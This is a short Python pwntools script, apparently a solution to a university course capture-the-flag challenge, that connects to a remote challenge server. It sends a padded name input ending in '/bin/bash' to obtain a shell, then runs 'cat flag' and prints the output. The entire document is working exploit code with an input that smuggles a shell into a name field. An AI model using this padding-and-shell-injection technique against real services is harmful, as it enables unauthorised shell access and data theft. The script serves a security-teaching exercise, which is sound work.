from pwn import *

p = remote("cs412-ctf.epfl.ch", 11000)
p.recvuntil("Hi! What's your name?")
p.sendline("aaaaaaaaaa/bin/bash")
p.sendline("cat flag")
flag = p.recvline()
print(flag.decode("utf-8"))
